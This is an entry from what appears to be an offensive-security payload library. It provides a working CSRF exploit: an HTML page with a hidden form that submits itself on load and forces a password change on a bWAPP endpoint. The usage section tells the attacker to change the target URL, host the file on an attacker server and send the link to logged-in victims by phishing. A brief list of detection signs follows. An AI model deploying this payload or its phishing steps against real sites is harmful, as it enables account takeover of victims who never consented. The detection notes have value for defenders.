---
id: 006f55a5-2754-462f-a32b-ffff2cbd0072
type: code
language: HTML
verified: true
created_at: '2020-07-31T15:22:16.084705+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
tags:
  - CSRF
  - payload
  - web
platforms:
  - Web
validated: true
---

# HTML-CSRF-Form-for-Password-Change

## Code

```html
<html>
  <body onload="document.getElementById('xsrf').submit();">
    <form id="xsrf" method="GET" action="http://localhost/BWAPP/csrf_1.php">
      <input name="password_new" type="hidden" value="hacked">
      <input name="password_conf" type="hidden" value="hacked">
      <input name="action" type="hidden" value="Change">
    </form>
  </body>
</html>
```

## Description

This HTML code creates a simple CSRF payload: a hidden form that automatically submits a password change request to the target web application when the page loads. It exploits the victim's active session by including the necessary form fields for password modification, allowing an attacker to alter the victim's account without their knowledge or interaction.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| action URL | The endpoint for password change (e.g., full path to the vulnerable page) | `http://target.com/change-password.php` |
| password_new | The new password to set for the victim | `hacked` |
| password_conf | Confirmation of the new password | `hacked` |
| action | The form submission trigger value | `Change` |

## Usage

Customize the action URL and password values to match the target application. Host the HTML file on an attacker-controlled server and send the link to the victim via phishing or social engineering. The victim must be logged into the target site for the session cookie to be included in the forged request. Used in procedures like [[procedures/CSRF-Attack-to-Change-Victim-Password]] for account takeover.

## Detection

- Absence of CSRF tokens in forms leads to successful exploitation; monitor for missing anti-CSRF headers.
- Unexpected password change logs in the application.
- Network logs showing GET/POST requests to password endpoints from unusual referrers.
- Browser behavior: Auto-submitting forms on page load can be flagged by client-side security tools.
